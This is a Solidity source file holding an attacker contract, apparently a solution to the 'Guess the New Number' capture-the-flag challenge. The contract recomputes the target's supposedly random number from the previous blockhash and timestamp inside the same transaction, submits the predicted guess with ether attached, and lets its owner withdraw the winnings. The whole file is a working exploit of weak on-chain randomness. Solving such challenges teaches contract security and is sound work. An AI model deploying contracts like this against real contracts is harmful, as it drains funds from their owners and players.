//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;
import "hardhat/console.sol";

interface GuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);

    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberAttacker {
    address payable immutable owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function guess(address target) external payable {
        uint8 n = uint8(
            uint256(
                keccak256(
                    abi.encode(blockhash(block.number - 1), block.timestamp)
                )
            )
        );

        GuessTheNewNumberChallenge(payable(target)).guess{
            value: msg.value,
            gas: gasleft()
        }(n);
    }

    receive() external payable {}

    function withdraw() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}
